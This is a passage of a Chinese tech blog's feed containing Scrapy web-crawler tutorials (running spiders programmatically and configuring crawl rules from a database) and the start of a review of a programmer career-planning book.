class=&quot;string&quot;&gt;&quot;source_site&quot;&lt;/span&gt;] = source_site[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;] &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; source_site &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; article&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;要注意的是&lt;code&gt;start_urls&lt;/code&gt;，&lt;code&gt;rules&lt;/code&gt;等都初始化成了对象的属性，都由传入的&lt;code&gt;rule&lt;/code&gt;对象初始化，&lt;code&gt;parse_item&lt;/code&gt;方法中的抽取规则也都有&lt;code&gt;rule&lt;/code&gt;对象提供。&lt;/p&gt;
&lt;p&gt;为了同时运行多个spider，我们需要稍稍修改上节中的运行脚本&lt;code&gt;run.py&lt;/code&gt;，如下所示：&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# -*- coding: utf-8 -*-&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; spiders.deep_spider &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; DeepSpider&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; model.config &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; DBSession&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; model.rule &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; Rule&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# scrapy api&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; scrapy &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; signals, log&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; twisted.internet &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; reactor&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; scrapy.crawler &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; Crawler&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; scrapy.settings &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; Settings&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;RUNNING_CRAWLERS = []&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;spider_closing&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(spider)&lt;/span&gt;:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&quot;&quot;&quot;Activates on spider closed signal&quot;&quot;&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    log.msg(&lt;span class=&quot;string&quot;&gt;&quot;Spider closed: %s&quot;&lt;/span&gt; % spider, level=log.INFO)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    RUNNING_CRAWLERS.remove(spider)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;not&lt;/span&gt; RUNNING_CRAWLERS:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        reactor.stop()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;log.start(loglevel=log.DEBUG)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;settings = Settings()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# crawl settings&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;settings.set(&lt;span class=&quot;string&quot;&gt;&quot;USER_AGENT&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;db = DBSession()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;rules = db.query(Rule).filter(Rule.enable == &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; rule &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; rules:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    crawler = Crawler(settings)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    spider = DeepSpider(rule)  &lt;span class=&quot;comment&quot;&gt;# instantiate every spider using rule&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    RUNNING_CRAWLERS.append(spider)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;# stop reactor when spider closes&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    crawler.signals.connect(spider_closing, signal=signals.spider_closed)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    crawler.configure()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    crawler.crawl(spider)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    crawler.start()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# blocks process so always keep as the last statement&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;reactor.run()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;我们从数据库中查出启用的rules，并对于rules中每一个规则实例化一个&lt;code&gt;DeepSpider&lt;/code&gt;对象。这儿的一个小技巧是建立了一个&lt;code&gt;RUNNING_CRAWLERS&lt;/code&gt;列表，新建立的&lt;code&gt;DeepSpider&lt;/code&gt;对象 spider 都会加入这个队列。在 spider 运行完毕时会调用&lt;code&gt;spider_closing&lt;/code&gt;方法，并将该spider从&lt;code&gt;RUNNING_CRAWLERS&lt;/code&gt;移除。最终，&lt;code&gt;RUNNING_CRAWLERS&lt;/code&gt;中没有任何spider了，我们会停止脚本。&lt;/p&gt;
&lt;p&gt;运行&lt;code&gt;run.py&lt;/code&gt;后，就能对Rule表中网站进行爬取了，但是我们现在还没有对爬下来的结果进行存储，所以看不到结果。下一篇&lt;a href=&quot;/blog/2015/05/22/using-redis-and-sqlalchemy-to-checkd-dup-and-store-scrapy-item&quot;&gt;博客&lt;/a&gt;，我们将使用 Scrapy 提供的强大的 Pipline 对数据进行保存并去重。&lt;/p&gt;
&lt;p&gt;现在我们可以往Rule表中加入成百上千个网站的规则，而不用添加一行代码，就可以对这成百上千个网站进行爬取。当然你完全可以做一个Web前端来完成维护Rule表的任务。当然Rule规则也可以放在除了数据库的任何地方，比如配置文件。&lt;/p&gt;
&lt;p&gt;&lt;em&gt;由于本人刚接触 Scrapy 不久，如有理解不当之处或是更好的解决方案，还请不吝赐教 :)&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;你可以在 &lt;a href=&quot;https://github.com/wuchong/scrapy-dynamic-configurable/tree/scrapy-0.24&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;GitHub&lt;/a&gt; 上看到本文的完整项目。&lt;/p&gt;
&lt;p&gt;&lt;em&gt;注：本文使用的 Scrapy 版本是 0.24，&lt;a href=&quot;https://github.com/wuchong/scrapy-dynamic-configurable&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;GitHub&lt;/a&gt; 上的master分支已支持 Scrapy 1.0&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;本系列的三篇文章&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;/blog/2015/05/22/running-scrapy-programmatically&quot;&gt;编程方式下运行 Scrapy spider&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;/blog/2015/05/22/running-scrapy-dynamic-and-configurable&quot;&gt;使用Scrapy定制可动态配置的爬虫&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;/blog/2015/05/22/using-redis-and-sqlalchemy-to-checkd-dup-and-store-scrapy-item&quot;&gt;使用Redis和SQLAlchemy对Scrapy Item去重并存储&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;###参考资料&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://kirankoduru.github.io/python/multiple-scrapy-spiders.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Running multiple scrapy spiders programmatically&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
    
    <summary type="html">
    
      在上一篇博客中我们讲解了如何使用编程的方式运行Scrapy spider。本文将讲解如何通过维护多个网站的爬取规则来抓取各个网站的数据。本文将讲解如何通过维护多个网站的爬取规则来抓取各个网站的数据
    
    </summary>
    
      <category term="程序设计" scheme="http://wuchong.me/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/"/>
    
    
      <category term="爬虫" scheme="http://wuchong.me/tags/%E7%88%AC%E8%99%AB/"/>
    
      <category term="scrapy" scheme="http://wuchong.me/tags/scrapy/"/>
    
  </entry>
  
  <entry>
    <title>编程方式下运行 Scrapy spider</title>
    <link href="http://wuchong.me/blog/2015/05/22/running-scrapy-programmatically/"/>
    <id>http://wuchong.me/blog/2015/05/22/running-scrapy-programmatically/</id>
    <published>2015-05-22T14:08:03.000Z</published>
    <updated>2016-03-08T12:17:25.000Z</updated>
    
    <content type="html">&lt;p&gt;最近实验室的项目中有一个需求是这样的，需要爬取若干个（数目不小）网站发布的文章元数据（标题、时间、正文等）。问题是这些网站都很老旧和小众，当然也不可能遵守 &lt;a href=&quot;http://en.wikipedia.org/wiki/Microdata_(HTML)&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Microdata&lt;/a&gt; 这类标准。这时候所有网页共用一套默认规则无法保证正确抓取到信息，而每个网页写一份spider代码也不切实际。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;这时候，我迫切地希望能有一个框架可以通过只写一份spider代码和维护多个网站的爬取规则，就能自动抓取这些网站的信息，很庆幸 &lt;a href=&quot;http://scrapy.org&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Scrapy&lt;/a&gt; 可以做到这点&lt;/strong&gt;。鉴于国内外关于这方面资料太少，所以我将这段时间来的经验和代码分享成了本文。&lt;/p&gt;
&lt;p&gt;为了讲清楚这件事，我分成了三篇文章来叙述：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;/blog/2015/05/22/running-scrapy-programmatically&quot;&gt;编程方式下运行 Scrapy spider&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;/blog/2015/05/22/running-scrapy-dynamic-and-configurable&quot;&gt;使用Scrapy定制可动态配置的爬虫&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;/blog/2015/05/22/using-redis-and-sqlalchemy-to-checkd-dup-and-store-scrapy-item&quot;&gt;使用Redis和SQLAlchemy对Scrapy Item去重并存储&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;本篇文章主要介绍如何使用编程的方式运行Scrapy爬虫。&lt;/p&gt;
&lt;p&gt;在开始本文之前，你需要对 Scrapy 有所熟悉，知道 Items、Spider、Pipline、Selector 的概念。如果你是 Scrapy 新手，想了解如何用Scrapy开始爬取一个网站，推荐你先看看&lt;a href=&quot;https://scrapy-chs.readthedocs.org/zh_CN/0.24/intro/tutorial.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;官方的教程&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;运行一个Scrapy爬虫可以通过命令行的方式（&lt;code&gt;scrapy runspider myspider.py&lt;/code&gt;）启动，也可以使用&lt;a href=&quot;https://scrapy-chs.readthedocs.org/zh_CN/0.24/topics/api.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;核心API&lt;/a&gt;通过编程的方式启动。为了获得更高的定制性和灵活性，我们主要使用后者的方式。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;我们使用官方教程中的 Dmoz 例子来帮助我们理解使用编程方式启动spider。我们的 spider 文件 &lt;code&gt;dmoz_spider.py&lt;/code&gt; 长这个样子：&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; scrapy&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;DmozItem&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(scrapy.Item)&lt;/span&gt;:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    title = scrapy.Field()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    link = scrapy.Field()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    desc = scrapy.Field()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;DmozSpider&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(scrapy.Spider)&lt;/span&gt;:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    name = &lt;span class=&quot;string&quot;&gt;&quot;dmoz&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    allowed_domains = [&lt;span class=&quot;string&quot;&gt;&quot;dmoz.org&quot;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    start_urls = [&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;string&quot;&gt;&quot;http://www.dmoz.org/Computers/Programming/Languages/Python/Books/&quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;string&quot;&gt;&quot;http://www.dmoz.org/Computers/Programming/Languages/Python/Resources/&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(self, response)&lt;/span&gt;:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; sel &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; response.xpath(&lt;span class=&quot;string&quot;&gt;&#39;//ul/li&#39;&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            item = DmozItem()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            item[&lt;span class=&quot;string&quot;&gt;&#39;title&#39;&lt;/span&gt;] = sel.xpath(&lt;span class=&quot;string&quot;&gt;&#39;a/text()&#39;&lt;/span&gt;).extract()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            item[&lt;span class=&quot;string&quot;&gt;&#39;link&#39;&lt;/span&gt;] = sel.xpath(&lt;span class=&quot;string&quot;&gt;&#39;a/@href&#39;&lt;/span&gt;).extract()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            item[&lt;span class=&quot;string&quot;&gt;&#39;desc&#39;&lt;/span&gt;] = sel.xpath(&lt;span class=&quot;string&quot;&gt;&#39;text()&#39;&lt;/span&gt;).extract()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;yield&lt;/span&gt; item&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;接下来我们需要写一个脚本&lt;code&gt;run.py&lt;/code&gt;，来运行DmozSpider：&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; dmoz_spider &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; DmozSpider&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# scrapy api&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; scrapy &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; signals, log&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; twisted.internet &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; reactor&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; scrapy.crawler &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; Crawler&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; scrapy.settings &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; Settings&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;spider_closing&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(spider)&lt;/span&gt;:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&quot;&quot;&quot;Activates on spider closed signal&quot;&quot;&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    log.msg(&lt;span class=&quot;string&quot;&gt;&quot;Closing reactor&quot;&lt;/span&gt;, level=log.INFO)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    reactor.stop()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;log.start(loglevel=log.DEBUG)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;settings = Settings()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# crawl responsibly&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;settings.set(&lt;span class=&quot;string&quot;&gt;&quot;USER_AGENT&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;crawler = Crawler(settings)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# stop reactor when spider closes&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;crawler.signals.connect(spider_closing, signal=signals.spider_closed)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;crawler.configure()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;crawler.crawl(DmozSpider())&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;crawler.start()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;reactor.run()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;然后运行&lt;code&gt;python run.py&lt;/code&gt;就启动了我们的爬虫了，但是由于我们这里没有对爬下来的结果进行任何的存储操作，所以看不到结果。你可以写一个 item pipline 用来将数据存储到数据库，使用&lt;code&gt;settings.set&lt;/code&gt;接口将这个 pipline 配置到&lt;code&gt;ITEMS_PIPLINE&lt;/code&gt;，我们将在&lt;a href=&quot;/blog/2015/05/22/using-redis-and-sqlalchemy-to-checkd-dup-and-store-scrapy-item&quot;&gt;第三篇文章&lt;/a&gt;中具体讲解这部分内容。&lt;a href=&quot;/blog/2015/05/22/running-scrapy-dynamic-and-configurable&quot;&gt;下一篇博客&lt;/a&gt;将会介绍如何通过维护多个网站的爬取规则来抓取各个网站的数据。&lt;/p&gt;
&lt;p&gt;你可以在 &lt;a href=&quot;https://github.com/wuchong/scrapy-dynamic-configurable/tree/scrapy-0.24&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;GitHub&lt;/a&gt; 上看到本文的完整项目。&lt;/p&gt;
&lt;p&gt;&lt;em&gt;注：本文使用的 Scrapy 版本是 0.24，&lt;a href=&quot;https://github.com/wuchong/scrapy-dynamic-configurable&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;GitHub&lt;/a&gt; 上的master分支已支持 Scrapy 1.0&lt;/em&gt;&lt;/p&gt;
&lt;h3 id=&quot;参考资料&quot;&gt;&lt;a href=&quot;#参考资料&quot; class=&quot;headerlink&quot; title=&quot;参考资料&quot;&gt;&lt;/a&gt;参考资料&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://kirankoduru.github.io/python/running-scrapy-programmatically.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Running scrapy spider programmatically&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
    
    <summary type="html">
    
      本篇文章主要介绍如何使用编程的方式运行Scrapy爬虫。
    
    </summary>
    
      <category term="程序设计" scheme="http://wuchong.me/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/"/>
    
    
      <category term="爬虫" scheme="http://wuchong.me/tags/%E7%88%AC%E8%99%AB/"/>
    
      <category term="scrapy" scheme="http://wuchong.me/tags/scrapy/"/>
    
  </entry>
  
  <entry>
    <title>读《程序员必读的职业规划书》</title>
    <link href="http://wuchong.me/blog/2015/05/15/read-programmer-career-planning/"/>
    <id>http://wuchong.me/blog/2015/05/15/read-programmer-career-planning/</id>
    <published>2015-05-15T14:48:56.000Z</published>
    <updated>2016-03-08T12:16:43.000Z</updated>
    
    <content type="html">&lt;p&gt;半年前我就有幸拜读了&lt;a href=&quot;http://weibo.com/easy&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;@Easy&lt;/a&gt;的&lt;a href=&quot;https://selfstore.io/products/190&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;《程序员跳槽全攻略》&lt;/a&gt;电子书，当时趁着限免机智地入手了。当晚一口气读完后感觉收获颇丰，随手就发了篇&lt;a href=&quot;http://weibo.com/2176287895/BAQPPgAmA?from=page_1005052176287895_profile&amp;amp;wvr=6&amp;amp;mod=weibotime&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;微博&lt;/a&gt;正能量了出去。在前几天的下午，又看到Easy为庆祝纸书上架发布了&lt;a href=&quot;http://weibo.com/p/1001603839169511193437&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;百人试读活动&lt;/a&gt;。以我的性格当然果断就报名啦。&lt;/p&gt;
&lt;p&gt;刚拿到纸书的第一印象是“哇，好薄啊！”，不过浓缩的都是精华。这更像是一本迷你武林秘籍，在你练功遇到瓶颈时，拿出这本小册子读一读，说不定就找到了突破的方式。纸书与电子书在内容上的差别不大，主要是调整了目录的结构，加了些插图和tips。虽然是第二次读这本书，也有一些新的收获，所以就写了篇文章记录下。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;职业规划&quot;&gt;&lt;a href=&quot;#职业规划&quot; class=&quot;headerlink&quot; title=&quot;职业规划&quot;&gt;&lt;/a&gt;职业规划&lt;/h2&gt;&lt;p&gt;电子书的书名叫《程序员跳槽全攻略》，纸书的书名叫《程序员必读的职业规划书》。从「跳槽攻略」到「职业规划」的改变，一方面是措辞上更加严肃和严谨了，另一方面是这本书在定位上不仅面向在职程序员，还面向了在校学生们。&lt;/p&gt;
&lt;p&gt;作为一名即将离开大学校园的应届毕业生，我深深认为在校生们应该看看这本书。私以为毕业后的第一份工作对个人的成长和影响是非常重要的，正确地选择人生的第一份工作是职业规划中的重要一课。而许多在校生对自己的职业没有很清晰的规划，大多数不知道该往什么技术方向发展。应聘PHP，可能只是PHP用最熟练，谈不上喜欢，谈不上规划。看完这本书后，你可能对于要选择哪条技术道路更加清晰。&lt;/p&gt;
&lt;p&gt;职业规划说白了就是为了实现人生目标而做的规划。比如我的理想是升职、加薪、迎娶白富美、当上CTO。为了当上CTO的终极目标，必须规划好当前一步。精通一门语言、积累高并发系统的开发经验、做好几个开源项目、让自己的博客UV过千，每一件事都是为了实现终极目标而做出的努力。有了人生目标，做每一件事都会变得有意义有动力，做成每件事的成就感又会让下件事更有动力。&lt;/p&gt;
&lt;h2 id=&quot;调整定位&quot;&gt;&lt;a href=&quot;#调整定位&quot; class=&quot;headerlink&quot; title=&quot;调整定位&quot;&gt;&lt;/a&gt;调整定位&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;站在风口不一定能飞起来，但站在冰山上必然会沉下去。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;互联网技术变化非常快，新技术层出不穷，但是并不是所有技术都有平等的待遇，相反总是有些技术突然之间变得炙手可热，有些技术不温不火逐渐没落。在调整个人定位上本书给了两个建议，（1）学会观察技术趋势（2）投资新兴市场和细分市场。&lt;/p&gt;
